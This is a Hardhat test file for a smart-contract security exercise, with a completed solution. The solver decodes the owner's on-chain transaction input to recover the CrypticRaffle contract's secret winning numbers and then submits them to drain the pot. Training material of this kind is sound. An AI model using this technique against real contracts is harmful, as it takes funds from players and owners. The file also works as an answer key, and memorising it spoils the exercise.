const { expect } = require("chai");
const { ethers } = require("hardhat");
const fs = require('fs');

describe("Sensitive On-Chain Data Exercise 3", function () {
  
  let attacker;

  const CRYPTIC_RAFFLE_ABI = fs.readFileSync("./test/sensitive-on-chain-data-3/CrypticRaffle.json").toString()
  const CRYPTIC_RAFFLE_ADDRESS = "0xca0B461f6F8Af197069a68f5f8A263b497569140"

  const PARTICIPATION_PRICE = ethers.utils.parseEther('0.01');

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [addictedGambler1, addictedGambler2, attacker] = await ethers.getSigners();

    // Set attacker balance to 0.1 ETH
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785D8A0000", // 0.1 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
    console.log("Attacker initial balance: ", ethers.utils.formatUnits(this.attackerInitialBalance), " ETH")

    // Load CrypticRaffle Contract
    this.crypticRaffle = new ethers.Contract(
      CRYPTIC_RAFFLE_ADDRESS, CRYPTIC_RAFFLE_ABI, addictedGambler1
    )
    
    // addictedGambler1 is trying his strategy
    let numbers;
    for(let i=0; i < 100; i++){
      numbers = [i, 20 + i, 100 - i];
      await this.crypticRaffle.connect(addictedGambler1).guessNumbers(
          numbers, {value: PARTICIPATION_PRICE}
      )
    }

    // addictedGambler2 is trying his strategy
    for(let i=0; i < 100; i++){
      numbers = [i + 1, i + 2, 0];
      await this.crypticRaffle.connect(addictedGambler2).guessNumbers(
          numbers, {value: PARTICIPATION_PRICE}
      )
    }

    this.initialCrypticRaffleBalance = await ethers.provider.getBalance(this.crypticRaffle.address);
    console.log("crypticRaffle initial balance (pot): ", ethers.utils.formatUnits(this.initialCrypticRaffleBalance), " ETH")
  })

  it("Exploit", async () => {    
    /** CODE YOUR SOLUTION HERE */

    /*

    CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

    Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
    Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
    Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000001 (?)
    Slot 3: 0x0000000000000000000000000000000000000000000000000000000000000004 (?)

    0xc2847b3b - guessNumber sighash
    0x3f5a9a5f - newRaffle sighash

    Our Block Number: 8660077
    Winning TX Block Number: 8660110

    Winning transaction:
    https://goerli.etherscan.io/tx/0xdb4b3952c434c2c6c0044a5c74e67219f21ecacb8f4ed1bfcd66d97be6cafece

    Input data:
    0xc2847b3b00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
    [Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

    [HEX]  [DEC]
    de --> 222
    7e --> 126
    47 --> 71

    Deployed on block: 8655090

    newRaffle trnasaciton (from the owner):
    https://goerli.etherscan.io/tx/0xdab60e3d7187d9c10b32589a1801d4f6bd0b8830635c5051b9f9f5301fee9f90

    Input data:
    0x3f5a9a5f00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
    [Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]
    
    */

    await this.crypticRaffle.connect(attacker).guessNumbers(
      [222, 126, 71], {value: PARTICIPATION_PRICE}
    )

  })

  after(async () => {
    /** SUCCESS CONDITIONS */

    // No ETH in the cryptoRaffle contract
    const currentCrypticRaffleBalance = await ethers.provider.getBalance(this.crypticRaffle.address);
    console.log("crypticRaffle current balance: ", ethers.utils.formatUnits(currentCrypticRaffleBalance), " ETH")
    expect(currentCrypticRaffleBalance).to.eq(0)

    // Attacker was able to guess the numbers and get all the ETH
    // - 0.1 ETH for transaction fees
    const currentAttackerBalance = await ethers.provider.getBalance(attacker.address)
    console.log("Attacker current balance: ", ethers.utils.formatUnits(currentAttackerBalance), " ETH")
    expect(currentAttackerBalance).to.be.gt(
      this.attackerInitialBalance.add(this.initialCrypticRaffleBalance).sub(ethers.utils.parseEther('0.1'))
    )
  
  })
});
